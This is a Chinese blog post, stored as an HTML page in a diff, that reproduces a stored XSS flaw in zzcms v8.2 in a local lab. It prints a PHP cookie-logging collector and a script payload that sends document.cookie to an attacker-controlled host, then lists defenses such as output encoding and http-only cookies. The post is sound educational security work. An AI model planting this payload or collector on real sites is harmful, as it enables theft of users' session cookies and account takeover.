@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="">
+  <head><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="XSS 跨域攻击机制及防御技术"/><meta name="keywords" content="XSS漏洞, Hrealm's Blog" /><link rel="alternate" href="http://hrealm.github.io/atom.xml" title="Hrealm's Blog" type="application/atom+xml"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
+<link rel="canonical" href="https://hrealm.github.io/posts/57250.html"/>
+
+<link rel="stylesheet" type="text/css" href="/lib/nprogress/nprogress.min.css" />
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />
+
+<script id="baidu_analytics">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?4bb0eaf166ad26e1851f29a756fea519";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script><script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":false,"pjax":true,"latex":false};
+</script>
+
+    <title>XSS 跨域攻击机制及防御技术 - Hrealm's Blog</title>
+  <meta name="generator" content="Hexo 6.2.0"></head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">Hrealm's Blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/">
+        <li class="mobile-menu-item">首页
+          </li>
+      </a><a href="/archives">
+        <li class="mobile-menu-item">归档
+          </li>
+      </a><a href="/tags">
+        <li class="mobile-menu-item">标签
+          </li>
+      </a><a href="/categories">
+        <li class="mobile-menu-item">分类
+          </li>
+      </a><a href="/about">
+        <li class="mobile-menu-item">关于
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">Hrealm's Blog</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/">
+            首页
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/archives">
+            归档
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/tags">
+            标签
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/categories">
+            分类
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/about">
+            关于
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">XSS 跨域攻击机制及防御技术
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2019-06-02
+        </span><span class="post-category">
+            <a href="/categories/Web-security/">Web-security</a>
+            </span>
+        </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">文章目录</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-text">背景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-text">XSS 攻击的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-text">XSS 攻击的分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E6%94%BB%E5%87%BB%E5%8D%B1%E5%AE%B3"><span class="toc-text">XSS 攻击危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0"><span class="toc-text">XSS 攻击实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%AD%E5%BB%BAzzcms-v8-2%E6%9C%8D%E5%8A%A1%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83"><span class="toc-text">搭建zzcms v8.2服务运行环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2%E6%94%BB%E5%87%BB%E8%80%85%E5%87%86%E5%A4%87%E7%9A%84%E6%94%B6%E9%9B%86%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E7%AB%99%E7%82%B9"><span class="toc-text">部署攻击者准备的收集敏感信息的站点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%96%BD%E6%94%BB%E5%87%BB"><span class="toc-text">实施攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-text">窃取用户敏感信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-%E6%94%BB%E5%87%BB%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-text">XSS 攻击的防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%B1%82%E9%98%B2%E5%BE%A1"><span class="toc-text">代码层防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2%E4%B8%93%E4%B8%9A%E7%9A%84%E9%98%B2%E5%BE%A1%E8%AE%BE%E5%A4%87"><span class="toc-text">部署专业的防御设备</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </div><div class="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在<a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/typelist?typeId=29"><code>CNVD</code>（国家信息安全漏洞共享平台）</a>找了一个存在<code>XSS</code>漏洞的<code>Web</code>应用进行复现。在<code>PHP</code> + <code>MySQL</code>环境上搭建出一个真实的实验环境对<code>zzcms v8.2</code>的一个<code>XSS</code>漏洞进行复现，进而解析<code>XSS</code>跨域攻击机制及防御技术。</p>
+<span id="more"></span>
+
+<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>跨站脚本攻击<code>（XSS）</code>是客户端<code>Web</code>安全的最大威胁之一，不仅危害<code>Web</code>业务本身，同时对访问<code>Web</code>业务的用户也会带来直接的影响。因跨站脚本攻击的多样性以及<code>Web</code>安全漏洞的隐蔽性，使得<code>XSS</code>的攻击很难彻底防御。</p>
+<h3 id="XSS-攻击的原理"><a href="#XSS-攻击的原理" class="headerlink" title="XSS 攻击的原理"></a>XSS 攻击的原理</h3><p>跨站脚本攻击本质上是一种将恶意脚本嵌入到当前网页中并执行的攻击方式。通常情况下，黑客通过“<code>HTML</code>注入”行为篡改网页，并插入恶意<code>JavaScript</code>脚本，从而在用户浏览网页的时候控制浏览器行为。这种漏洞产生的主要原因是网站对于用户提交的数据过滤不严格，导致用户提交的数据可以修改当前页面或者插入了一段脚本。</p>
+<p>攻击者可利用其用户身份在输入参数时，附带了恶意脚本，在提交服务器之后，服务器没有对用户端传入的参数做任何安全过滤。之后服务器会根据业务流程，将恶意脚本存储在数据库中或直接回显给用户。在用户浏览含有恶意脚本的页面时，恶意脚本会在用户浏览器上成功执行。</p>
+<h3 id="XSS-攻击的分类"><a href="#XSS-攻击的分类" class="headerlink" title="XSS 攻击的分类"></a>XSS 攻击的分类</h3><ul>
+<li>反射型跨站攻击：涉及浏览器—服务器交互</li>
+<li>存储型跨站攻击：涉及浏览器—服务器—数据库交互</li>
+<li>DOM型跨站攻击：涉及浏览器—服务器交互</li>
+</ul>
+<h3 id="XSS-攻击危害"><a href="#XSS-攻击危害" class="headerlink" title="XSS 攻击危害"></a>XSS 攻击危害</h3><ul>
+<li>窃取用户Cookie</li>
+<li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li>
+<li>窃取具有商业价值的资料</li>
+<li>非法转账，非法进行交易</li>
+<li>植入木马病毒</li>
+<li>强行弹出广告</li>
+<li>操控用户主机</li>
+<li>…</li>
+</ul>
+<h2 id="XSS-攻击实现"><a href="#XSS-攻击实现" class="headerlink" title="XSS 攻击实现"></a>XSS 攻击实现</h2><p><code>XSS</code>攻击是需要满足<code>XSS</code>攻击的条件。<code>XSS</code>漏洞的利用过程较为直接。反射型&#x2F;<code>DOM</code>型跨站攻击均可以理解为：服务器接收到数据，并原样返回给用户，整个过程中<code>Web</code>应用并没有存入数据库，这也导致了攻击无法持久化，仅针对当次请求有效，也就无法直接攻击其他用户。一般这两类攻击也可利用钓鱼、垃圾邮件等手段产生攻击其他用户效果。</p>
+<p>反射型与存储型<code>XSS</code>攻击的实现原理和主要流程非常相似，但由于存储型<code>XSS</code>攻击的持久性及危害更加强大，所以本次<code>XSS</code>攻击实现，将采用存储型跨站攻击方式进行实践分析。</p>
+<p>首先，要成功实施跨站脚本攻击，我们需要了解一下存储型跨站的主要业务流程</p>
+<p><img src="/57250%5Cbusiness-process.png" alt="business-process"></p>
+<p>根据上图业务流程，存储型<code>XSS</code>攻击有两个重点的步骤：信息入库处理、出库处理，结合<code>XSS</code>攻击的特性可知，<code>XSS</code>攻击成功必须要满足以下四个条件：</p>
+<ol>
+<li>目标网页有攻击者可控的输入点</li>
+<li>输入信息可以在受害者的浏览器中显示</li>
+<li>输入具备功能的可执行脚本，且在信息输入和输出的过程中没有特殊字符的过滤和字符转义等防护措施，或者说防护措施可以通过一定的手段绕过</li>
+<li>浏览器将输入解析为脚本，并具备执行该脚本的能力</li>
+</ol>
+<p>以上四点缺一不可。如果需要做针对<code>XSS</code>攻击的防御，只要针对上述任何一点做好防御，攻击就无法正常开展，<code>XSS</code>漏洞也就不存在了，后面将详细解析<code>XSS</code>攻击的防御。</p>
+<h3 id="搭建zzcms-v8-2服务运行环境"><a href="#搭建zzcms-v8-2服务运行环境" class="headerlink" title="搭建zzcms v8.2服务运行环境"></a>搭建zzcms v8.2服务运行环境</h3><p>因为<code>zzcms v8.2</code>是基于<code>php</code> + <code>mysql</code>环境下运行的，这里将采用<code>php</code> +<code>mysql</code> + <code>xampp</code> 将<code>zzcms</code>部署在<code>window</code>系统上，然后通过浏览器地址栏输入主机<code>IP</code>可进入到<code>zzcms</code>的首页，即搭建成功。部署好靶机后，我们任需要一个收集敏感信息的站点，一个攻击者站点，同时还需要一个用户主机的站点，准备好这些站点，将可以进行漏洞复现。</p>
+<h3 id="部署攻击者准备的收集敏感信息的站点"><a href="#部署攻击者准备的收集敏感信息的站点" class="headerlink" title="部署攻击者准备的收集敏感信息的站点"></a>部署攻击者准备的收集敏感信息的站点</h3><p>同样，我们任需通过<code>xampp</code>来部署收集敏感信息的站点，在<code>..\xampp\htdocs\</code>路径下新建一个文件夹用于采收用户的敏感信息，这里复现漏洞将采用获取用户的<code>cookie</code>值为例。新建文件夹命名为<code>xss</code>，然后在<code>..\xampp\htdocs\xss</code>路径下新建<code>index.php</code>用于获取用户的<code>cookie</code>。在该<code>php</code>文件下输入以下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];      <span class="comment">//以GET方式获得cookie变量值 </span></span><br><span class="line"><span class="variable">$time</span>=<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d g:i:s&#x27;</span>);    <span class="comment">//以“年-月-日 时：分：秒”的格式显示时间 </span></span><br><span class="line"><span class="variable">$referer</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_REFERER&#x27;</span>);       <span class="comment">//获取referer </span></span><br><span class="line"><span class="variable">$cookietxt</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;cookie.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);   <span class="comment">//打开cookie.txt，若不存在则创建它 </span></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$cookietxt</span>,<span class="string">&quot;time:&quot;</span>.<span class="variable">$time</span>. <span class="string">&quot; cookie:&quot;</span>.<span class="variable">$cookie</span>. <span class="string">&quot; referer:&quot;</span>.<span class="variable">$referer</span>);    <span class="comment">//写入文件 </span></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$cookietxt</span>);     <span class="comment">//关闭文件 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="实施攻击"><a href="#实施攻击" class="headerlink" title="实施攻击"></a>实施攻击</h3><p>跨站脚本攻击最典型的形式就是在网站的评论功能、论坛私信功能和发表帖子以及留言板等处使用静心构造的<code>HTML</code>代码提交数据，从而达到恶意攻击目的。</p>
+<p>在我们刚刚部署好的靶机上，攻击者访问了刚刚搭建的存在<code>XSS</code>漏洞的<code>zzcms</code>网站，攻击者通过登录注册进入到存在漏洞的输入框，开始植入恶意代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=&quot;http://192.168.238.148/xss/index.php?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>+<span class="string">&#x27;&quot;width=0 height=0 border=0/&gt;&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>img</code>的<code>src</code>属性自带跨域机制，以及指定的<code>url</code>传参的形式将窃取到敏感信息发送至攻击者准备的收集信息站点。攻击的类型为存储型跨站攻击，也就是说，攻击者植入的这些恶意代码将通过存储型跨站的业务流程，存入数据库，并能返回给用户，同时浏览器将输出解析为脚本，并执行该脚本。而且该脚本长期有效，并且一直存在该网站上。</p>
+<p>到此，攻击者已经完成了攻击，接下来就是等待用户点击此链接，从而窃取用户的<code>cookie</code>值。</p>
+<h3 id="窃取用户敏感信息"><a href="#窃取用户敏感信息" class="headerlink" title="窃取用户敏感信息"></a>窃取用户敏感信息</h3><p>攻击者发布存在恶意代码的链接将一直存在该网站，而普通用户并不知道该链接存在恶意代码，所以当普通用户点击该链接后，攻击者将窃取敏感信息。</p>
+<p><img src="/57250%5Ccookie.jpg" alt="cookie"></p>
+<p>上图所示均为攻击者收集敏感信息站点所收集到的用户<code>cookie</code>信息，攻击者可采用此敏感信息进行伪登录，从而获取更多用户信息。</p>
+<h2 id="XSS-攻击的防御"><a href="#XSS-攻击的防御" class="headerlink" title="XSS 攻击的防御"></a>XSS 攻击的防御</h2><p>上面提到了<code>XSS</code>攻击的必要条件，那么只要破坏<code>XSS</code>攻击的必要条件将可防止<code>XSS</code>安全漏洞。目前对<code>XSS</code>漏洞的防御一般有两种方式。</p>
+<h3 id="代码层防御"><a href="#代码层防御" class="headerlink" title="代码层防御"></a>代码层防御</h3><p><code>XSS</code>攻击防范主要是由程序漏洞造成的，治标还要治本，从代码层面上采用预防漏洞的高级编程技术，可以帮助大大减少<code>XSS</code>安全漏洞。</p>
+<ul>
+<li>对用户输入和<code>URL</code>参数进行过滤，对输出进行编码</li>
+<li>对用户所有提交内容进行验证，包括<code>URL</code>、查询关键字、<code>HTTP</code>头、<code>POST</code>数据等</li>
+<li>仅接受指定长度范围内、采用适当格式、采用所预期的字符的内容提交</li>
+<li>在变量值输出到前端的<code>HTML</code>时进行编码和转义，对特殊字符进行过滤和转义</li>
+<li>给关键的<code>cookie</code>使用<code>http-only</code></li>
+</ul>
+<h3 id="部署专业的防御设备"><a href="#部署专业的防御设备" class="headerlink" title="部署专业的防御设备"></a>部署专业的防御设备</h3><p>目前较为流行的有入侵防御产品，利用的就是入侵防御产品对应用层攻击的检测防御能力。用户在选择相应的产品时，可先了解相关产品的<code>XSS</code>、<code>SQL</code>注入等<code>Web</code>威胁的检测方式。部分检测<code>XSS</code>攻击产品是通过一定特征进行匹配代码检测。一旦检测到关键指定代码，将判定为<code>XSS</code>攻击，从而阻断程序进行。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>XSS</code>攻击是最常见的<code>Web</code>攻击方式之一，和<code>SQL</code>注入漏洞不同的是，<code>XSS</code>漏洞存在多样性和隐蔽性，更加难以发现。一般的防御措施也仅限在通过编写高质量的程序，从而来过滤存在恶意的代码，但是这样难免会出现遗漏或者疏忽的地方，所以在安全与高效之间，必须要兼顾安全再进一步高效编码，一旦疏忽或者遗漏而产生漏洞带来的后果将是不可估量的。</p>
+<p>参考文献</p>
+<p>《Web安全防护指南》、《黑客攻防实战秘技》、<a target="_blank" rel="noopener" href="http://netsecurity.51cto.com/art/200807/81551.htm">XSS攻击防御技术白皮书</a>、<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/185654.html">XSS的攻击与防范</a></p>
+
+      </div>
+      <div class="post-copyright">
+    <p class="copyright-item">
+      <span>原文作者: </span>
+      <a href="https://hrealm.github.io">Hrealm</a>
+    </p>
+    <p class="copyright-item">
+      <span>原文链接: </span>
+      <a href="https://hrealm.github.io/posts/57250.html">https://hrealm.github.io/posts/57250.html</a>
+    </p>
+    <p class="copyright-item">
+      <span>许可协议: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
+    </p>
+  </div>
+      <footer class="post-footer">
+        <div class="post-tags">
+            <a href="/tags/XSS%E6%BC%8F%E6%B4%9E/">XSS漏洞</a>
+            </div>
+        
+        <nav class="post-nav"><a class="prev" href="/posts/2616.html">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">JavaScript 执行机制</span>
+        <span class="prev-text nav-mobile">上一篇</span>
+      </a>
+    <a class="next" href="/posts/41560.html">
+        <span class="next-text nav-default">从 URL 到浏览器渲染完成</span>
+        <span class="prev-text nav-mobile">下一篇</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"></div></div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:hrealm@foxmail.com" class="iconfont icon-email" title="email"></a>
+        <a target="_blank" rel="noopener" href="https://github.com/Hrealm" class="iconfont icon-github" title="github"></a>
+        <a href="http://hrealm.github.io/atom.xml" class="iconfont icon-rss" title="rss" ></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2022<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">Hrealm</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/pjax/jquery.pjax.min.js"></script>
+  <script type="text/javascript" src="/lib/nprogress/nprogress.min.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
+</body>
+</html>
